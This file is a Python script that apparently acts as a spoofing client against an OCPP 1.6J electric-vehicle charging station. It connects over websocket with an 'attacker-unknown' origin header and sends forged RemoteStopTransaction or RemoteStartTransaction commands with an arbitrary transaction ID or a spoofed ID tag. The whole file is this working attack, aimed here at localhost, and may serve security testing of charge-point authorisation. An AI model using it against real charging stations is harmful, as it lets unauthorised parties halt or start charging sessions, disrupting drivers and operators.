import asyncio
import json
import sys
import time
import websockets
from datetime import datetime

DEFAULT_URI_TPL = "ws://localhost:9000/{station}"

def now_iso():
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

def build_call(unique_id: str, action: str, payload: dict):
    # OCPP 1.6J CALL format: [2, UniqueId, Action, Payload]
    return [2, unique_id, action, payload]

async def run(action: str, station: str):
    uri = DEFAULT_URI_TPL.format(station=station)
    print(f"[{now_iso()}] Connecting to {uri}")
    # Extra headers to emphasize "unknown" origin (not whitelisted)
    headers = [("Origin-CSMS-ID", "attacker-unknown")]
    async with websockets.connect(uri, subprotocols=["ocpp1.6"], additional_headers=headers) as ws:
        print(f"[{now_iso()}] Connected as spoofing client. Sending {action} ...")
        uid = f"spoof-{int(time.time()*1000)}"
        if action == "RemoteStopTransaction":
            payload = {"transactionId": "999999"}  # arbitrary
        else:
            # RemoteStartTransaction minimalistic payload
            payload = {"idTag": "SPOOFED", "connectorId": 1}
        msg = build_call(uid, action, payload)
        await ws.send(json.dumps(msg))
        print(f"[{now_iso()}] Sent: {msg}")
        # Try to read any immediate server reaction (optional)
        try:
            resp = await asyncio.wait_for(ws.recv(), timeout=1.0)
            print(f"[{now_iso()}] ServerResp: {resp}")
        except asyncio.TimeoutError:
            pass
        print(f"[{now_iso()}] Done.")

if __name__ == "__main__":
    action = "RemoteStopTransaction"
    station = "CP_1"
    if len(sys.argv) >= 2:
        candidate = sys.argv[1]
        if candidate in ("RemoteStop", "RemoteStopTransaction"):
            action = "RemoteStopTransaction"
        elif candidate in ("RemoteStart", "RemoteStartTransaction"):
            action = "RemoteStartTransaction"
    if len(sys.argv) >= 3:
        station = sys.argv[2]
    asyncio.run(run(action, station))

